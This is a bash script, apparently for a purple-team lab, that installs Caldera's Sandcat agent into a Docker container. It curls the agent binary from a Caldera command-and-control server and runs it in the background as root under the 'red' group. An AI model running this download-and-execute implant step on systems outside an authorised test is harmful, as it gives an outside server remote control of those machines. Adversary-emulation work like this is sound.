#!/usr/bin/env bash
set -euo pipefail

BASE_DIR="${BASE_DIR:-/home/labuser/purple-lab}"
ENV_FILE="${ENV_FILE:-${BASE_DIR}/generated/caldera.env}"

if [ -f "${ENV_FILE}" ]; then
  set -a
  source "${ENV_FILE}"
  set +a
fi

TARGET_CONTAINER="${1:-int-endpoint-01}"
CALDERA_SERVER="${2:-${CALDERA_SERVER:-http://192.168.56.10:8888}}"
SANDCAT_GROUP="${3:-red}"
SANDCAT_PAW="${4:-${TARGET_CONTAINER}}"

echo "[install_sandcat_int_endpoint] target=${TARGET_CONTAINER}"
echo "[install_sandcat_int_endpoint] server=${CALDERA_SERVER}"
echo "[install_sandcat_int_endpoint] group=${SANDCAT_GROUP}"
echo "[install_sandcat_int_endpoint] paw=${SANDCAT_PAW}"

docker exec -u 0 "${TARGET_CONTAINER}" bash -lc "
set -euo pipefail

mkdir -p /opt/caldera
cd /opt/caldera

pkill -x sandcat || true
rm -f /opt/caldera/sandcat

curl -fsSL -X POST \
  -H 'file:sandcat.go' \
  -H 'platform:linux' \
  '${CALDERA_SERVER}/file/download' \
  -o /opt/caldera/sandcat

chmod +x /opt/caldera/sandcat

nohup /opt/caldera/sandcat \
  -server '${CALDERA_SERVER}' \
  -group '${SANDCAT_GROUP}' \
  -paw '${SANDCAT_PAW}' \
  -v > /var/log/sandcat.log 2>&1 &

sleep 5

echo '=== sandcat binary ==='
ls -l /opt/caldera/sandcat || true
echo '=== sandcat process ==='
pgrep -af sandcat || true
echo '=== sandcat log ==='
tail -n 30 /var/log/sandcat.log || true
"
